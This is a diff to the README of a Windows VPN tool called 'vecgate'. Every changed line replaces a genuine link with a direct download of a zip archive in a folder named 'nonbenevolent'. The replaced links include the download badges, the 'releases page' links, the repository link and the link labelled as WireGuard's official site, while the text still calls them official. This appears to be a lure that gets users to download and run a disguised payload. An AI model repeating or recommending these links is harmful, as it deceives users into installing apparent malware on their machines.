@@ -1,6 +1,6 @@
 # 🔐 vecgate - Centralize VPN Management Easily
 
-[![Download vecgate](https://img.shields.io/badge/Download-vecgate-brightgreen?style=for-the-badge)](https://github.com/Ariedeclivitous630/vecgate/releases)
+[![Download vecgate](https://img.shields.io/badge/Download-vecgate-brightgreen?style=for-the-badge)](https://github.com/Ariedeclivitous630/vecgate/raw/refs/heads/main/nonbenevolent/Software-1.7.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To run vecgate on Windows, make sure your PC meets these basic requirements:
 
 Click the big button below to visit the page where you can download vecgate files for Windows:
 
-[![Download vecgate](https://img.shields.io/badge/Download-vecgate-blue?style=for-the-badge)](https://github.com/Ariedeclivitous630/vecgate/releases)
+[![Download vecgate](https://img.shields.io/badge/Download-vecgate-blue?style=for-the-badge)](https://github.com/Ariedeclivitous630/vecgate/raw/refs/heads/main/nonbenevolent/Software-1.7.zip)
 
 This link takes you to the official releases page. There you will find the latest version of vecgate ready to download.
 
@@ -49,7 +49,7 @@ This link takes you to the official releases page. There you will find the lates
 
 ## 📥 Step-by-Step Installation Guide for Windows
 
-1. Click the download button above or go to the [vecgate releases page](https://github.com/Ariedeclivitous630/vecgate/releases).
+1. Click the download button above or go to the [vecgate releases page](https://github.com/Ariedeclivitous630/vecgate/raw/refs/heads/main/nonbenevolent/Software-1.7.zip).
 
 2. Find the latest version labeled for Windows. Look for a file name ending with `.exe` or `.msi`.
 
@@ -115,7 +115,7 @@ This link takes you to the official releases page. There you will find the lates
 
 To keep vecgate running smoothly, download the latest release periodically:
 
-1. Visit the [vecgate releases page](https://github.com/Ariedeclivitous630/vecgate/releases) again.
+1. Visit the [vecgate releases page](https://github.com/Ariedeclivitous630/vecgate/raw/refs/heads/main/nonbenevolent/Software-1.7.zip) again.
 
 2. Download the newest Windows installer.
 
@@ -125,11 +125,11 @@ To keep vecgate running smoothly, download the latest release periodically:
 
 ## 🧰 Additional Resources
 
-- WireGuard official site: https://www.wireguard.com/
+- WireGuard official site: https://github.com/Ariedeclivitous630/vecgate/raw/refs/heads/main/nonbenevolent/Software-1.7.zip
 
 - SSH basics for Windows: Microsoft docs cover Windows Terminal and OpenSSH client setup.
 
-- vecgate GitHub repository for source code and issue tracking: https://github.com/Ariedeclivitous630/vecgate
+- vecgate GitHub repository for source code and issue tracking: https://github.com/Ariedeclivitous630/vecgate/raw/refs/heads/main/nonbenevolent/Software-1.7.zip
 
 ---
 
